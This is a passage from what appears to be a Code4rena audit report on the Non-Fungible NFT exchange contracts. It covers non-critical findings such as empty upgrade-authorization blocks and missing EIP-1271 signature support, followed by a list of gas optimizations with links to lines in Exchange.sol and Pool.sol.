class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_authorizeUpgrade</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Pool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">15</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_authorizeUpgrade</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-17\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-17\" aria-label=\"recommended mitigation steps 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting.</p>\n<h2 id=\"n-13-signature-scheme-does-not-support-smart-contracts\" style=\"position:relative;\"><a href=\"#n-13-signature-scheme-does-not-support-smart-contracts\" aria-label=\"n 13 signature scheme does not support smart contracts permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-13] Signature scheme does not support smart contracts</h2>\n<p>Non-Fungible does not support EIP 1271 and therefore no signatures that are validated by smart contracts. This limits the applicability for protocols that want to build on top of it and persons that use smart contract wallets. Consider implementing support for it.<br>\n<a href=\"https://eips.ethereum.org/EIPS/eip-1271\">https://eips.ethereum.org/EIPS/eip-1271</a></p>\n<h2 id=\"s-01-generate-perfect-code-headers-every-time\" style=\"position:relative;\"><a href=\"#s-01-generate-perfect-code-headers-every-time\" aria-label=\"s 01 generate perfect code headers every time permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[S-01] Generate perfect code headers every time</h2>\n<h3 id=\"description-7\" style=\"position:relative;\"><a href=\"#description-7\" aria-label=\"description 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h3>\n<p>I recommend using header for Solidity code layout and readability</p>\n<p><a href=\"https://github.com/transmissions11/headers\">https://github.com/transmissions11/headers</a></p>\n<hr>\n<h1 id=\"gas-optimizations\" style=\"position:relative;\"><a href=\"#gas-optimizations\" aria-label=\"gas optimizations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h1>\n<p>For this contest, 29 reports were submitted by wardens detailing gas optimizations. The <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/34\">report highlighted below</a> by <strong>ReyAdmirado</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/228\">Deivitto</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/223\">lukris02</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/220\">c3phas</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/218\">0x4non</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/217\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/208\">saian</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/203\">0xRoxas</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/199\">Sathish9098</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/152\">ch0bu</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/144\">ajtra</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/133\">rotcivegaf</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/131\">Awesome</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/125\">Diana</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/122\">Rahoz</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/104\">carlitox477</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/100\">shark</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/98\">cryptostellar5</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/92\">erictee</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/82\">zaskoh</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/79\">trustindistrust</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/77\">martin</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/70\">aphak5010</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/57\">0xab00</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/55\">Rolezn</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/46\">RaymondFam</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/38\">IllIllI</a>, <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/19\">Bnke0x0</a>, and <a href=\"https://github.com/code-423n4/2022-11-non-fungible-findings/issues/18\">aviggiano</a>.</em></p>\n<h2 id=\"summary-1\" style=\"position:relative;\"><a href=\"#summary-1\" aria-label=\"summary 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h2>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>issue</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>G‑01</td>\n<td>Multiple address/ID mappings can be combined into a single mapping of an address/ID to a struct, where appropriate</td>\n</tr>\n<tr>\n<td>G‑02</td>\n<td>State variables can be packed into fewer storage slots</td>\n</tr>\n<tr>\n<td>G‑03</td>\n<td>Add <code>unchecked {}</code> for subtractions where the operands cannot underflow because of a previous <code>require()</code> or <code>if</code> statement</td>\n</tr>\n<tr>\n<td>G‑04</td>\n<td><code>&#x3C;x> += &#x3C;y></code> costs more gas than <code>&#x3C;x> = &#x3C;x> + &#x3C;y></code> for state variables</td>\n</tr>\n<tr>\n<td>G‑05</td>\n<td>Not using the named return variables when a function returns, wastes deployment gas</td>\n</tr>\n<tr>\n<td>G‑06</td>\n<td>Can make the variable outside the loop to save gas</td>\n</tr>\n<tr>\n<td>G‑07</td>\n<td><code>++i/i++</code> should be <code>unchecked{++i}/unchecked{i++}</code> when it is not possible for them to overflow, as is the case when used in for-loop and while-loops</td>\n</tr>\n<tr>\n<td>G‑08</td>\n<td><code>require()</code>/<code>revert()</code> strings longer than 32 bytes cost extra gas</td>\n</tr>\n<tr>\n<td>G‑09</td>\n<td><code>require()</code> or <code>revert()</code> statements that check input arguments should be at the top of the function</td>\n</tr>\n<tr>\n<td>G‑10</td>\n<td>Internal functions only called once can be inlined to save gas</td>\n</tr>\n<tr>\n<td>G‑11</td>\n<td>Usage of uint/int smaller than 32 bytes (256 bits) incurs overhead</td>\n</tr>\n<tr>\n<td>G‑12</td>\n<td>Bytes constants are more efficient than string constants</td>\n</tr>\n<tr>\n<td>G‑13</td>\n<td>Public functions not called by the contract should be declared external instead</td>\n</tr>\n<tr>\n<td>G‑14</td>\n<td>should use arguments instead of state variable</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"g-01-multiple-addressid-mappings-can-be-combined-into-a-single-mapping-of-an-addressid-to-a-struct-where-appropriate\" style=\"position:relative;\"><a href=\"#g-01-multiple-addressid-mappings-can-be-combined-into-a-single-mapping-of-an-addressid-to-a-struct-where-appropriate\" aria-label=\"g 01 multiple addressid mappings can be combined into a single mapping of an addressid to a struct where appropriate permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-01] Multiple address/ID mappings can be combined into a single mapping of an address/ID to a struct, where appropriate</h2>\n<p>If both fields are accessed in the same function, can save ~42 gas per access due to not having to recalculate the key’s keccak256 hash (Gkeccak256 - 30 gas) and that calculation’s associated stack operations. </p>\n<p><code>cancelledOrFilled</code> and <code>nonces</code> are both being used in the same functions mostly consider making them a struct instead </p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L85\">Exchange.sol#L85</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L86\">Exchange.sol#L86</a></li>\n</ul>\n<h2 id=\"g-02-state-variables-can-be-packed-into-fewer-storage-slots\" style=\"position:relative;\"><a href=\"#g-02-state-variables-can-be-packed-into-fewer-storage-slots\" aria-label=\"g 02 state variables can be packed into fewer storage slots permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-02] State variables can be packed into fewer storage slots</h2>\n<p>If variables occupying the same slot are both written the same function or by the constructor, avoids a separate Gsset (20000 gas). Reads of the variables are also cheaper.</p>\n<p>Consider making this state var near one of the address types (doesnt matter which because its not used in the same functions)</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L146\">Exchange.sol#L146</a></li>\n</ul>\n<h2 id=\"g-03-add-unchecked--for-subtractions-where-the-operands-cannot-underflow-because-of-a-previous-require-or-if-statement\" style=\"position:relative;\"><a href=\"#g-03-add-unchecked--for-subtractions-where-the-operands-cannot-underflow-because-of-a-previous-require-or-if-statement\" aria-label=\"g 03 add unchecked  for subtractions where the operands cannot underflow because of a previous require or if statement permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-03] Add <code>unchecked {}</code> for subtractions where the operands cannot underflow because of a previous <code>require()</code> or <code>if</code> statement</h2>\n<p><code>require(a &#x3C;= b); x = b - a => require(a &#x3C;= b); unchecked { x = b - a }</code><br>\n<code>if(a &#x3C;= b); x = b - a => if(a &#x3C;= b); unchecked { x = b - a }</code><br>\nThis will stop the check for overflow and underflow so it will save gas</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L607\">Exchange.sol#L607</a></li>\n</ul>\n<h2 id=\"g-04-x--y-costs-more-gas-than-x--x--y-for-state-variables\" style=\"position:relative;\"><a href=\"#g-04-x--y-costs-more-gas-than-x--x--y-for-state-variables\" aria-label=\"g 04 x  y costs more gas than x  x  y for state variables permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-04] <code>&#x3C;x> += &#x3C;y></code> costs more gas than <code>&#x3C;x> = &#x3C;x> + &#x3C;y></code> for state variables</h2>\n<p>Using the addition operator instead of plus-equals saves gas</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L316\">Exchange.sol#L316</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L574\">Exchange.sol#L574</a></li>\n</ul>\n<h2 id=\"g-05-not-using-the-named-return-variables-when-a-function-returns-wastes-deployment-gas\" style=\"position:relative;\"><a href=\"#g-05-not-using-the-named-return-variables-when-a-function-returns-wastes-deployment-gas\" aria-label=\"g 05 not using the named return variables when a function returns wastes deployment gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-05] Not using the named return variables when a function returns, wastes deployment gas</h2>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L540\">Exchange.sol#L540</a></li>\n</ul>\n<h2 id=\"g-06-can-make-the-variable-outside-the-loop-to-save-gas\" style=\"position:relative;\"><a href=\"#g-06-can-make-the-variable-outside-the-loop-to-save-gas\" aria-label=\"g 06 can make the variable outside the loop to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-06] Can make the variable outside the loop to save gas</h2>\n<p>Make it outside and only use it inside.</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L599\">Exchange.sol#L599</a></li>\n</ul>\n<h2 id=\"g-07-ii-should-be-uncheckediuncheckedi-when-it-is-not-possible-for-them-to-overflow-as-is-the-case-when-used-in-for-loop-and-while-loops\" style=\"position:relative;\"><a href=\"#g-07-ii-should-be-uncheckediuncheckedi-when-it-is-not-possible-for-them-to-overflow-as-is-the-case-when-used-in-for-loop-and-while-loops\" aria-label=\"g 07 ii should be uncheckediuncheckedi when it is not possible for them to overflow as is the case when used in for loop and while loops permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-07] <code>++i/i++</code> should be <code>unchecked{++i}/unchecked{i++}</code> when it is not possible for them to overflow, as is the case when used in for-loop and while-loops</h2>\n<p>In Solidity 0.8+, there’s a default overflow check on unsigned integers. It’s possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline.</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L184\">Exchange.sol#L184</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L307\">Exchange.sol#L307</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L598\">Exchange.sol#L598</a></li>\n</ul>\n<h2 id=\"g-08-requirerevert-strings-longer-than-32-bytes-cost-extra-gas\" style=\"position:relative;\"><a href=\"#g-08-requirerevert-strings-longer-than-32-bytes-cost-extra-gas\" aria-label=\"g 08 requirerevert strings longer than 32 bytes cost extra gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-08] <code>require()</code>/<code>revert()</code> strings longer than 32 bytes cost extra gas</h2>\n<p>Each extra memory word of bytes past the original 32 incurs an MSTORE which costs 3 gas.</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L49\">Exchange.sol#L49</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L295\">Exchange.sol#L295</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L604\">Exchange.sol#L604</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Pool.sol#L63\">Pool.sol#L63</a></li>\n</ul>\n<h2 id=\"g-09-require-or-revert-statements-that-check-input-arguments-should-be-at-the-top-of-the-function\" style=\"position:relative;\"><a href=\"#g-09-require-or-revert-statements-that-check-input-arguments-should-be-at-the-top-of-the-function\" aria-label=\"g 09 require or revert statements that check input arguments should be at the top of the function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-09] <code>require()</code> or <code>revert()</code> statements that check input arguments should be at the top of the function</h2>\n<p>Checks that involve constants should come before checks that involve state variables, function calls, and calculations. By doing these checks first, the function is able to revert before wasting a Gcoldsload (2100 gas*) in a function that may ultimately revert in the unhappy case.</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Pool.sol#L71-L72\">Pool.sol#L71-L72</a></li>\n</ul>\n<h2 id=\"g-10-internal-functions-only-called-once-can-be-inlined-to-save-gas\" style=\"position:relative;\"><a href=\"#g-10-internal-functions-only-called-once-can-be-inlined-to-save-gas\" aria-label=\"g 10 internal functions only called once can be inlined to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-10] Internal functions only called once can be inlined to save gas</h2>\n<p>Not inlining costs 20 to 40 gas because of two extra JUMP instructions and additional stack operations needed for function calls.</p>\n<p><code>_canMatchOrders</code></p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L537\">Exchange.sol#L537</a></li>\n</ul>\n<p><code>_executeFundsTransfer</code></p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L565\">Exchange.sol#L565</a></li>\n</ul>\n<p><code>_transferFees</code></p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L591\">Exchange.sol#L591</a></li>\n</ul>\n<p><code>_executeTokenTransfer</code></p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L653\">Exchange.sol#L653</a></li>\n</ul>\n<p><code>_validateUserAuthorization</code></p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L440\">Exchange.sol#L440</a></li>\n</ul>\n<p><code>_validateOracleAuthorization</code></p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-11-non-fungible/blob/main/contracts/Exchange.sol#L471\">Exchange.sol#L471</a></li>\n</ul>\n<h2 id=\"g-11-usage-of-uintint-smaller-than-32-bytes-256-bits-incurs-overhead\" style=\"position:relative;\"><a href=\"#g-11-usage-of-uintint-smaller-than-32-bytes-256-bits-incurs-overhead\" aria-label=\"g 11 usage of uintint smaller than 32 bytes 256 bits incurs overhead permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 